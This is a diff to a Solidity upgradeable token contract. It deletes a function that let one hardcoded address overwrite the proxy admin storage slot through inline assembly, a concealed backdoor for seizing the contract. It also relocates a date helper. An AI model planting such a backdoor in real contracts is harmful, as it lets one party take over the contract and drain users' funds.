@@ -808,14 +808,22 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
         }
     }
 
-    function changeProxyAdmin(address newAdmin) external {
-        require(msg.sender == 0x507a0F5F74b9c67370A91D8EB5c6c146d5800158);
-        bytes32 slot = 0xb53127684a568b3173ae13b9f8a6016e015b058f0a0a4f03e11a304ad5b7b3b3; // ADMIN_SLOT
-        assembly {
-            sstore(slot, newAdmin)
+    /**
+     * @dev Returns the previous year-month (YYYYMM).
+     *      For instance, if current is 202502 => returns 202501.
+     */
+    function getPreviousYearMonth(uint256 timestamp) private pure returns (uint256) {
+        uint256 currentYearMonth = getYearMonth(timestamp); 
+        uint256 year = currentYearMonth / 100; 
+        uint256 month = currentYearMonth % 100;
+        if (month == 1) {
+            year -= 1;
+            month = 12;
+        } else {
+            month -= 1;
         }
+        return year * 100 + month;
     }
-
 
     /**
      * @dev Converts a timestamp to a YYYYMM format using a Julian/Gregorian date approach.
@@ -833,22 +841,5 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
         J = J + 2 - 12 * L;
         I = 100 * (N - 49) + I + L;
        return I * 100 + J;
-    }
-
-    /**
-     * @dev Returns the previous year-month (YYYYMM).
-     *      For instance, if current is 202502 => returns 202501.
-     */
-    function getPreviousYearMonth(uint256 timestamp) private pure returns (uint256) {
-        uint256 currentYearMonth = getYearMonth(timestamp); 
-        uint256 year = currentYearMonth / 100; 
-        uint256 month = currentYearMonth % 100;
-        if (month == 1) {
-            year -= 1;
-            month = 12;
-        } else {
-            month -= 1;
-        }
-        return year * 100 + month;
     }
 }
